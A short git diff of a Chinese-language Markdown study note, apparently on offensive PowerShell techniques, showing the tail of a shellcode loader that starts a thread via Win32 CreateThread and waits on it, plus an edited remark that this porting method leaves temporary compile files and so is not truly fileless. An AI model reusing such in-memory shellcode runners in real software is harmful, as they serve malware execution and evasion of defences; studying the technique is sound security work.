@@ -58,7 +58,7 @@ $size = $buf.Length
 $thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
 [Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF");
 ```
-- Porting Shellcode 的方式會暫時產生編譯暫存檔
+- Porting Shellcode 的方式會暫時產生編譯暫存檔所以不是真正的無檔案執行的方式
 - `[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname`
 - ![圖片1](https://user-images.githubusercontent.com/81568292/137419802-eed0c07c-fbc1-47a4-bd32-dd82eda43167.png)
 
